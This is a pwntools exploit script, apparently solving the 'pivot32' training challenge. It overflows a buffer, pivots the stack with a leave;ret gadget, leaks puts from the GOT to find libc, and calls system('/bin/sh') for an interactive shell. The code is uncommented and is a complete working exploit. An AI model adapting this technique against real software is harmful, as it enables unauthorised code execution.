from pwn import *

io = process("./pivot32")
elf = ELF("./pivot32")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

#gdb.attach(io)

io.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ", drop = True)
pivot_addr = io.recvuntil("\n", drop = True)
print(pivot_addr)
pivot_addr = int(pivot_addr, 16)
print("pivot_addr = " + hex(pivot_addr))
io.recvuntil("> ", drop = True)

main_addr = 0x08048686
leave_ret = 0x080485f5
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
#print(hex(puts_plt))

payload0 = p32(0) + p32(puts_plt) + p32(main_addr) + p32(puts_got)
io.sendline(payload0)
io.recvuntil("> ", drop = True)

payload1 = (0x28)*b'a' + p32(pivot_addr) + p32(leave_ret)
io.sendline(payload1)
io.recvuntil("Thank you!\n")
puts_addr = u32(io.recv(4).ljust(4,b'\x00'))
print("puts_addr = " + hex(puts_addr))

libc_base = puts_addr - libc.sym["puts"]
print("libc_base = " + hex(libc_base))

sys_addr = libc_base + libc.sym["system"]
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))


io.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ", drop = True)
pivot_addr = io.recvuntil("\n", drop = True)
print(pivot_addr)
pivot_addr = int(pivot_addr, 16)
print("pivot_addr = " + hex(pivot_addr))

io.recvuntil("> ", drop = True)
payload2 = p32(0) + p32(sys_addr) + p32(0) + p32(binsh_addr)
io.sendline(payload2)
io.recvuntil("> ", drop = True)

payload3 = (0x28)*b'a' + p32(pivot_addr) + p32(leave_ret)
io.sendline(payload3)

io.interactive()





